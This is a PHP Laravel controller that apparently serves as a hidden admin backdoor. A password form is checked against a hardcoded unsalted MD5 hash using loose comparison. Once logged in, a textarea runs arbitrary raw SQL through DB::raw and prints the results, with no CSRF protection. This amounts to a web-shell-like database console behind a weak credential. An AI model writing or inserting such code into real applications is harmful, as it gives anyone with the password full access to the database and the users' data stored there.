<?php namespace App\Http\Controllers;

use App\Http\Requests;
use App\Http\Controllers\Controller;

use Request;
use Session;

class CydController extends Controller {

	public function index()
	{
		return redirect('cyd/login');
	}

	public function login()
	{
		echo '
			<form method="post" action="'.url().'/cyd/submit">
				<input type="password" name="password" />
				<input type="submit" />
			</form>
		';
	}

	public function submit(){
		$password =  Request::input('password');
		if(md5($password) == '967a95906dd995f57c238326dab7b49a'){
			session(['cyd' => 'admin']);
			return redirect('cyd/admin');
		}else{
			return redirect('cyd/login');
		}
	}

	public function admin(){
		if(session('cyd') != 'admin'){
			return redirect('cyd/login');
		}

		echo '
			<form method="post" action="'.url().'/cyd/admin">
				<textarea name="query"></textarea><br/>
				<input type="submit" />
			</form>
		';

		if(null !== Request::input('query')){
			$query = \DB::select( \DB::raw(Request::input('query')) );
			echo '<pre>';
			print_r($query);
			echo '</pre>';
		}
	}
}
